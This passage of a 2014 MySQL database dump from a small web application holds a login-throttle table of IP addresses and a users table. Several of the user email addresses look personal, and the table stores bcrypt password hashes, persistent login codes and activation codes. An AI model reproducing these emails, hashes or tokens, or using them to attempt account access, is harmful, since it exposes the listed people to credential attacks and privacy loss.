/*!40000 ALTER TABLE `throttle` DISABLE KEYS */;
INSERT INTO `throttle` VALUES (1,1,NULL,0,0,0,NULL,NULL,NULL),(2,2,'103.6.158.181',0,0,1,NULL,NULL,'2014-05-18 01:39:14'),(3,3,'207.6.94.236',0,0,1,NULL,NULL,'2014-05-18 02:08:07'),(4,4,'103.6.158.181',0,0,1,NULL,NULL,'2014-05-18 05:32:48'),(5,5,'103.6.158.181',0,0,1,NULL,NULL,'2014-05-18 06:04:24'),(6,6,'103.6.158.181',0,0,0,NULL,NULL,NULL),(7,7,'103.6.158.181',0,0,0,NULL,NULL,NULL),(8,8,NULL,0,0,1,NULL,NULL,'2014-05-18 03:57:59'),(9,9,'69.118.34.45',0,0,0,NULL,NULL,NULL),(10,10,'92.238.175.106',0,0,0,NULL,NULL,NULL),(11,11,'66.249.80.35',2,0,0,'2014-05-18 07:41:10',NULL,NULL);
/*!40000 ALTER TABLE `throttle` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users`
--

DROP TABLE IF EXISTS `users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `email` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `password` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  `permissions` text COLLATE utf8_unicode_ci,
  `activated` tinyint(1) NOT NULL DEFAULT '0',
  `activation_code` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `activated_at` timestamp NULL DEFAULT NULL,
  `last_login` timestamp NULL DEFAULT NULL,
  `persist_code` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `reset_password_code` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `first_name` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `last_name` varchar(255) COLLATE utf8_unicode_ci DEFAULT NULL,
  `created_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `updated_at` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  `username` varchar(255) COLLATE utf8_unicode_ci NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `users_email_unique` (`email`),
  KEY `users_activation_code_index` (`activation_code`),
  KEY `users_reset_password_code_index` (`reset_password_code`)
) ENGINE=InnoDB AUTO_INCREMENT=12 DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users`
--

LOCK TABLES `users` WRITE;
/*!40000 ALTER TABLE `users` DISABLE KEYS */;
INSERT INTO `users` VALUES (1,'admin@rumblr.biz','$2y$10$0r7Ot4s8aex8sCQJ2kSJiunafcGoDt1WV0OZNn3fqPXP1rS5wb6nu',NULL,1,NULL,NULL,'2014-05-18 13:04:41','$2y$10$7bo59fn4YqX5mHeUX.KXQeKwBL.QnInzqx6NkpeDG7WjWedtrq84.',NULL,NULL,NULL,'2014-05-15 03:08:25','2014-05-18 13:04:41','admin'),(2,'somasundaram321@gmail.com','$2y$10$7xM.RJbf6G24iLGQOtPRCu1WiV638BQMl4yx2sMo0jNJ/XCsc5hSS',NULL,1,NULL,'2014-05-15 04:25:41','2014-05-15 04:26:19','$2y$10$PpbCHWHCxxq91jIKqaKxLuw38z0ZifeIWh4VU7cSk953Ngwhw9UHO',NULL,NULL,NULL,'2014-05-15 04:23:40','2014-05-15 04:26:19','somus'),(3,'icupbaby@gmail.com','$2y$10$WlG7O4moANZXJ.6lI/Md9e4pVH1IcGj/LXP6zN1mru1quEUg3XbkC',NULL,1,NULL,'2014-05-15 04:39:41','2014-05-15 05:58:20','$2y$10$4amau9De7omqWAnS.P7tP.9.RieOpOCS2eB.ZA4pisZV9TtR6mF2q',NULL,NULL,NULL,'2014-05-15 04:39:30','2014-05-15 05:58:20','icupbaby'),(4,'john@mailinator.com','$2y$10$UKOBnrwuwY6Hkp/VbPA0sOiFbInfsBYkjk5OJNRaFJuyj41YMmlmS',NULL,1,NULL,'2014-05-15 04:49:12','2014-05-15 05:43:57','$2y$10$9XLYI94sKuvpyFONJ7uun.DJjSUJkdQNUZfNbKQ4JCGjoo09wHJwa',NULL,NULL,NULL,'2014-05-15 04:48:56','2014-05-15 05:43:57','John'),(5,'mike@mailinator.com','$2y$10$LOpy00/0Ir8ZjOOQtQ4Iv.sYrsFlBvtmfjIyjDr5XeAE1l64vZPna',NULL,1,NULL,'2014-05-15 04:55:17','2014-05-15 05:43:11','$2y$10$T1sFQCRvSJNq5WFMyjdvcuEmk9fL0I6IwH6RV0KgHdbex2HmK4awy',NULL,NULL,NULL,'2014-05-15 04:55:01','2014-05-15 05:43:11','Mike'),(6,'bill@mailinator.com','$2y$10$C2OU6LT496ehV85oJCiSoOgxuPQhI10oMQvwpJ1r7nP/3Rq0r4YIK',NULL,1,NULL,'2014-05-15 05:06:00','2014-05-15 05:56:37','$2y$10$eWmZGtZHS8n65NHxtsZHeOlb.1jBg9kaVUz3T19bpOhFMD9xw393S',NULL,NULL,NULL,'2014-05-15 05:04:54','2014-05-15 05:56:37','Bill'),(7,'sriramancse@gmail.com','$2y$10$of.VBkPvMg3xEzxJkFYnme/FbwK0co.4nx6UYQ6SdU5sEeettQShy',NULL,1,NULL,'2014-05-15 05:32:58','2014-05-15 07:26:35','$2y$10$FyiLM7zHJpPJOrnnJGzXYOcAxIKCpIDzQ0HeI0TFzl.pWDGnUZEf6',NULL,NULL,NULL,'2014-05-15 05:31:13','2014-05-15 07:26:35','sriraman'),(8,'markmitch@mailinator.com','$2y$10$L4DyGT2kZ1.B33fFBQCumOrGRXKsrFmvyamERVp4Eoq/5kHZDMAYu',NULL,0,'6H1dh6XjETiMDSLaZNbXqazUYdXVwANiAtCU2JajhD',NULL,NULL,NULL,NULL,NULL,NULL,'2014-05-15 05:49:28','2014-05-15 05:49:28',''),(9,'payxoo@gmail.com','$2y$10$iwVPMeGhlg/nIazwMDbppuPvFsGjOUoOzdpwC07fkbk1wgJVpV/h.',NULL,1,NULL,'2014-05-16 03:22:47','2014-05-18 04:18:38','$2y$10$IGSA3aRKKAkmfyY4HtxvnO5pdX0GCi1zpZPkuKT.li0vhSQHsE/lq',NULL,NULL,NULL,'2014-05-16 03:22:16','2014-05-18 04:18:38','payxoo'),(10,'lifikebifi@mailtemp.info','$2y$10$ob8wOC4G6C88Y1ZvO4CJuOUCIT2jugUvH3nr95QS8vVMo7OaHnWXG',NULL,1,NULL,'2014-05-18 06:39:53','2014-05-18 06:40:14','$2y$10$0ZymgB4YsGS9r./D/m0F3.zK1QXS/IPIis4a/bBjIgXfbVBYRp1Iu',NULL,NULL,NULL,'2014-05-18 06:39:41','2014-05-18 06:40:14','rumblr12'),(11,'test@test.com','$2y$10$..QN9aaxQFEn/cMxeTlQZuqikFerltsyXSGnNomLvVqFziWqDBj.a',NULL,0,'cEAkEvm3jzesgWaVsrjU5rNunJZXjOkLYrATdZNWlI',NULL,NULL,NULL,NULL,NULL,NULL,'2014-05-18 07:40:49','2014-05-18 07:40:49','test');
/*!40000 ALTER TABLE `users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `users_groups`
--

DROP TABLE IF EXISTS `users_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `users_groups` (
  `user_id` int(10) unsigned NOT NULL,
  `group_id` int(10) unsigned NOT NULL,
  PRIMARY KEY (`user_id`,`group_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `users_groups`
--

LOCK TABLES `users_groups` WRITE;
/*!40000 ALTER TABLE `users_groups` DISABLE KEYS */;
INSERT INTO `users_groups` VALUES (1,2),(2,1),(3,1),(4,1),(5,1),(6,1),(7,1),(8,1),(9,1),(10,1),(11,1);
/*!40000 ALTER TABLE `users_groups` ENABLE KEYS */;
UNLOCK TABLES;
/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;

/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;

-- Dump completed on 2014-05-19  0:06:46
